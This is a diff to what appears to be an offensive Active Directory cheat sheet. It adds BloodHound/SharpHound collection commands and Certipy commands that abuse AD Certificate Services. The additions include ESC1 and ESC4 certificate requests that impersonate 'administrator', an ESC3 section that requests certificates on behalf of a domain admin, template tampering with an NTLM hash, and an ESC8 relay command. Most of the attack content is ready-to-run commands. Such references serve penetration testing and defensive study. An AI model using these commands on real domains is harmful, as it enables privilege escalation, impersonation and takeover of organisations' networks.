@@ -75,9 +75,10 @@
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
+      - [ESC3 - Misconfigured Enrollment Agent Templates](#esc3---misconfigured-enrollment-agent-templates)
       - [ESC4 - Access Control Vulnerabilities](#esc4---access-control-vulnerabilities)
-      * [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
-      * [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
+      - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
+      - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -210,41 +211,43 @@ Use the correct collector
 * AzureHound for Azure Active Directory
 * SharpHound for local Active Directory
 
-use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+* use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+  ```powershell
+  # require: Install-Module -name Az -AllowClobber
+  # require: Install-Module -name AzureADPreview -AllowClobber
+  Connect-AzureAD
+  Connect-AzAccount
+  . .\AzureHound.ps1
+  Invoke-AzureHound
+  ```
 
-```powershell
-# require: Install-Module -name Az -AllowClobber
-# require: Install-Module -name AzureADPreview -AllowClobber
-Connect-AzureAD
-Connect-AzAccount
-. .\AzureHound.ps1
-Invoke-AzureHound
-```
+* use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+  ```powershell
+  # run the collector on the machine using SharpHound.exe
+  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
+  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
+  .\SharpHound.exe -c all -d active.htb -SearchForest
+  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
+  .\SharpHound.exe -c all,GPOLocalGroup
+  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
+  .\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
 
-use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+  # or run the collector on the machine using Powershell
+  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
+  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
 
-```powershell
-# run the collector on the machine using SharpHound.exe
-# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
-# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
-.\SharpHound.exe -c all -d active.htb -SearchForest
-.\SharpHound.exe --EncryptZip --ZipFilename export.zip
-.\SharpHound.exe -c all,GPOLocalGroup
-.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
-.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
-.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
-
-# or run the collector on the machine using Powershell
-# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
-# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
-Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
-
-# or remotely via BloodHound Python
-# https://github.com/fox-it/BloodHound.py
-pip install bloodhound
-bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
-```
+  # or remotely via BloodHound Python
+  # https://github.com/fox-it/BloodHound.py
+  pip install bloodhound
+  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+  ```
+* Collect more data for certificates exploitation using Certipy
+  ```ps1
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
+  ```
 
 Then import the zip/json files into the Neo4J database and query them.
 
@@ -264,6 +267,7 @@ You can add some custom queries like :
 * [Bloodhound-Custom-Queries from @hausec](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
 * [BloodHoundQueries from CompassSecurity](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
 * [BloodHound Custom Queries from Exegol - @ShutdownRepo](https://raw.githubusercontent.com/ShutdownRepo/Exegol/master/sources/bloodhound/customqueries.json)
+* [Certipy BloodHound Custom Queries from ly4k](https://github.com/ly4k/Certipy/blob/main/customqueries.json)
 
 Replace the customqueries.json file located at `/home/username/.config/bloodhound/customqueries.json` or `C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`.
 
@@ -2213,11 +2217,12 @@ Exploitation:
     or
     PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
-* Use Certify or [Certi](https://github.com/eloypgz/certi) to request a Certificate and add an alternative name (user to impersonate)
+* Use Certify, [Certi](https://github.com/eloypgz/certi) or [Certipy](https://github.com/ly4k/Certipy) to request a Certificate and add an alternative name (user to impersonate)
     ```ps1
     # request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
     Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
     certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
+    certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
     ```
 * Use OpenSSL and convert the certificate, do not enter a password
     ```ps1
@@ -2246,6 +2251,21 @@ Exploitation:
 * Request a certificate specifying the `/altname` as a domain admin like in [ESC1](#esc1---misconfigured-certificate-templates).
 
 
+#### ESC3 - Misconfigured Enrollment Agent Templates
+
+> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users
+
+* Request a certificate based on the vulnerable certificate template ESC3.
+  ```ps1
+  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
+  [*] Saved certificate and private key to 'john.pfx'
+  ```
+* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user 
+  ```ps1
+  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
+  ```
+
+
 #### ESC4 - Access Control Vulnerabilities
 
 > Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability
@@ -2265,6 +2285,17 @@ Exploitation:
   ```ps1
   python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
   ```
+
+Using Certipy
+
+```ps1
+# overwrite the configuration to make it vulnerable to ESC1
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
+# request a certificate based on the ESC4 template, just like ESC1.
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
+# restore the old configuration
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
+```
 
 #### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 
 
@@ -2287,7 +2318,7 @@ Mitigation:
 #### ESC7 - Vulnerable Certificate Authority Access Control
 
 Exploitation:
-* Detect CAs that allow low privileged users the ManageCA permission
+* Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions
     ```ps1
     Certify.exe find /vulnerable
     ```
@@ -2387,6 +2418,10 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
     unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
     output          -       Output path to store base64 generated crt.
     ```
+* Version 4: Certipy ESC8
+  ```ps1
+  certipy relay -ca 172.16.19.100
+  ```
 
 ### Dangerous Built-in Groups Usage
 
